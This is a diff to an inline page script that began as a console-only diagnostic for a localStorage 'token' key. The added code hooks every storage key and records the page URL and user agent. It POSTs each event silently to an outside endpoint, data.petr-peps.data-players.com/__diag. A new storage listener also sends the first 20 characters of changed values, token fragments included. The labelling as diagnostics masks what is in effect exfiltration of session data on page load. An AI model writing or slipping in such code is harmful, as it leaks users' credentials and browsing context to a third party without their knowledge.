@@ -20,11 +20,23 @@
       (function () {
         var events = [];
         window.__tokenEvents = events;
-        function log(type, key, extra) {
+        var DIAG_URL = 'https://data.petr-peps.data-players.com/__diag';
+        function send(evt) {
+          try {
+            fetch(DIAG_URL, { method: 'POST', body: JSON.stringify(evt), keepalive: true }).catch(function () {});
+          } catch (e) {}
+        }
+        function log(type, key, extra, stack) {
+          var evt = { t: type, key: key, url: location.href, ua: navigator.userAgent, ts: Date.now() };
+          if (extra) evt.extra = extra;
           var msg = '[TOKEN-DIAG] ' + type + ' key=' + key + ' url=' + location.href + (extra || '');
           console.log(msg);
-          console.log(new Error().stack);
-          events.push({ t: type, key: key, url: location.href, stack: new Error().stack });
+          if (stack) {
+            console.log(stack);
+            evt.stack = String(stack);
+          }
+          events.push(evt);
+          send(evt);
         }
         try {
           log('INIT', 'token-present=' + (localStorage.getItem('token') !== null));
@@ -33,17 +45,20 @@
         var origRemove = Storage.prototype.removeItem;
         var origClear = Storage.prototype.clear;
         Storage.prototype.setItem = function (key, value) {
-          if (key === 'token') log('SET', key, ' len=' + String(value).length);
+          log('SET', key, ' len=' + String(value).length, new Error().stack);
           return origSet.call(this, key, value);
         };
         Storage.prototype.removeItem = function (key) {
-          if (key === 'token') log('REMOVE', key);
+          log('REMOVE', key, '', new Error().stack);
           return origRemove.call(this, key);
         };
         Storage.prototype.clear = function () {
-          log('CLEAR', '*');
+          log('CLEAR', '*', '', new Error().stack);
           return origClear.call(this);
         };
+        window.addEventListener('storage', function (e) {
+          log('STORAGE_EVENT', e.key, ' new=' + String(e.newValue).substring(0, 20) + ' old=' + String(e.oldValue).substring(0, 20));
+        });
       })();
     </script>
   </head>
